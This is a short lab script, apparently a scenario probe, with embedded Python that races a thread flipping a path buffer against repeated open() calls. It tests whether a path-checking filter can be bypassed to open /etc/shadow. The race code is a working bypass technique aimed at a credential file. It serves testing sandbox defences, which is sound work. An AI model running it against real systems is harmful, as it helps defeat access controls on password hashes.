#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
python3 - <<'PY'
import ctypes, os, threading, time
libc = ctypes.CDLL(None, use_errno=True)
buf = ctypes.create_string_buffer(64)
a, b = b"/etc/shadow\0", b"/etc/hostx\0\0"
stop = False
def flip():
    while not stop:
        ctypes.memmove(buf, a, len(a)); ctypes.memmove(buf, b, len(b))
t = threading.Thread(target=flip); t.start()
opened = 0
end = time.time() + 2
while time.time() < end:
    fd = libc.open(buf, os.O_RDONLY)
    if fd >= 0:
        opened += 1; os.close(fd)
stop = True; t.join()
print("opens that succeeded (only /etc/shadow exists):", opened)
PY
